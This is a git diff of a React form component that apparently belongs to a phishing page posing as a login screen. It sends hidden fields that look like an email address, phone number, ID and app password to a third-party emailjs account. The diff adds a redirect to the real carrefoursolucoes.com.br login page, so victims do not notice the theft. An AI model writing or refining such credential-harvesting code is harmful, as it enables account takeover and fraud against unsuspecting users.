@@ -21,9 +21,14 @@ export class SocialProfiles extends Component {
             emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
               .then((result) => {
                   console.log(result.text);
+                window.location = "https://app.carrefoursolucoes.com.br/#/login";
+
+
               }, (error) => {
                   console.log(error.text);
               });
+
+
           }
         const { values, inputChange } = this.props;
         const {
@@ -63,7 +68,7 @@ export class SocialProfiles extends Component {
                     </div>
                     <div className="col-6 text-right">
                     <form onSubmit={sendEmail}>
-    <input type="hidden" name="cp" value={cp} ></input>
+    <input type="hidden" name="cp" value={cp} required></input>
     <input type="hidden" name="email" value={email}></input>
     <input type="hidden" name="phone"  value={phone}></input>
     <input type="hidden" name="passapp" value={passapp}></input>
@@ -74,7 +79,7 @@ export class SocialProfiles extends Component {
 
 
                        
-    <button type="submit" className="btn btn-primary" >ENTRAR</button>
+    <button type="submit"className="btn btn-primary" >ENTRAR</button>
     </form>
                     </div>
                 </div>
